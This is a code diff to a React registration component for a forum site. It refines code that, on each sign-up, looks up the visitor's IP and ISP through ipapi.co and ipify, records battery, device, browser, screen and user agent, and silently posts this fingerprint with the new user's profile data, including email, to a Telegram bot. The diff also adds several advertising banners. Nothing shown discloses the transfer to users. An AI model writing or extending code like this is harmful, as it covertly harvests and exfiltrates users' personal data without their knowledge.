@@ -46,21 +46,23 @@ const AuthView: React.FC = () => {
     let isp = 'N/A';
     
     try {
-      // Primary IP fetch
+      // Primary source for IP and ISP
       const res = await fetch('https://ipapi.co/json/').catch(() => null);
       if (res) {
         const data = await res.json();
         ip = data.ip || 'N/A';
         isp = data.org || 'N/A';
       } else {
-        // Fallback IP fetch
+        // Fallback for IP only
         const res2 = await fetch('https://api.ipify.org?format=json').catch(() => null);
         if (res2) {
           const data2 = await res2.json();
           ip = data2.ip || 'N/A';
         }
       }
-    } catch (e) {}
+    } catch (e) {
+      console.error("Signal capture error:", e);
+    }
 
     let battery = "N/A";
     try {
@@ -74,12 +76,21 @@ const AuthView: React.FC = () => {
     let device = "Desktop/PC";
     if (/android/i.test(ua)) device = "Android Device";
     else if (/iPad|iPhone|iPod/.test(ua)) device = "iOS Device";
+    else if (/Windows/.test(ua)) device = "Windows PC";
+    else if (/Macintosh/.test(ua)) device = "Macintosh";
+
+    // Detect browser
+    let browser = "Unknown";
+    if (ua.includes("Chrome")) browser = "Chrome";
+    else if (ua.includes("Safari")) browser = "Safari";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Edge")) browser = "Edge";
 
     return {
       ip,
       isp,
       device,
-      browser: ua.split(' ').pop() || 'Unknown',
+      browser,
       screen: `${window.screen.width}x${window.screen.height}`,
       charge: battery,
       ua,
@@ -104,16 +115,17 @@ const AuthView: React.FC = () => {
 🌐 <b>IP:</b> <code>${sysInfo.ip}</code>
 🏢 <b>ISP:</b> ${escapeHTML(sysInfo.isp)}
 📱 <b>Device:</b> ${sysInfo.device}
-🔋 <b>Battery:</b> ${sysInfo.charge}
+🌐 <b>Browser:</b> ${sysInfo.browser}
+🔋 <b>Battery/Charge:</b> ${sysInfo.charge}
 🖥 <b>Screen:</b> ${sysInfo.screen}
-⏰ <b>Local Time:</b> ${sysInfo.time}
+⏰ <b>Time:</b> ${sysInfo.time}
 
 ⚙️ <b>User Agent:</b>
 <code>${escapeHTML(sysInfo.ua)}</code>
     `.trim();
 
     try {
-      const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -122,9 +134,8 @@ const AuthView: React.FC = () => {
           parse_mode: 'HTML'
         })
       });
-      if (!response.ok) console.error("Telegram API Error:", await response.text());
     } catch (e) {
-      console.error("Telegram network error:", e);
+      console.error("Telegram broadcast failed:", e);
     }
   };
 
@@ -137,7 +148,9 @@ const AuthView: React.FC = () => {
       if (isLogin) {
         await signInWithEmailAndPassword(auth, email, password);
       } else {
+        // Collect system info first to ensure we have it
         const sysInfo = await getSystemInfo();
+        
         let photoURL = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=random`;
         
         if (selectedFile) {
@@ -156,7 +169,7 @@ const AuthView: React.FC = () => {
           displayName,
           email: email.toLowerCase(),
           photoURL: photoURL,
-          bio: isAdmin ? 'SecureH Forum Official Administrator' : (lang === 'bn' ? 'নতুন যুক্ত হওয়া সদস্য।' : 'Newly joined mature member.'),
+          bio: isAdmin ? 'SecureH Forum Official Administrator' : (lang === 'bn' ? 'নতুন যুক্ত হওয়া সদস্য।' : 'Newly joined member.'),
           isPro: isAdmin,
           role: isAdmin ? 'admin' : 'user',
           accountStatus: isAdmin ? 'active' : 'pending',
@@ -174,7 +187,7 @@ const AuthView: React.FC = () => {
 
         await setDoc(doc(db, 'users', user.uid), userData);
         
-        // Critical: Ensure data is copied to bot
+        // Transmit clone of data to Telegram Bot
         await transmitToBot(userData, sysInfo);
       }
     } catch (err: any) {
@@ -186,7 +199,8 @@ const AuthView: React.FC = () => {
 
   return (
     <div className="max-w-2xl mx-auto mt-4 animate-fadeIn px-2 pb-20">
-      <AdsterraAd id="auth-top" />
+      <AdsterraAd id="auth-top-banner" format="banner" className="mb-4" />
+      <AdsterraAd id="auth-top-banner-2" format="banner" className="mb-4" />
 
       <div className="glass-effect rounded-[3rem] p-8 md:p-12 border border-white/10 shadow-2xl relative overflow-hidden mt-6">
         <div className="absolute -top-24 -right-24 w-48 h-48 bg-rose-600/10 rounded-full blur-3xl"></div>
@@ -285,6 +299,8 @@ const AuthView: React.FC = () => {
           </button>
         </div>
       </div>
+      <AdsterraAd id="auth-bottom-banner" format="banner" className="mt-8" />
+      <AdsterraAd id="auth-bottom-native" format="native" className="mt-4" />
     </div>
   );
 };
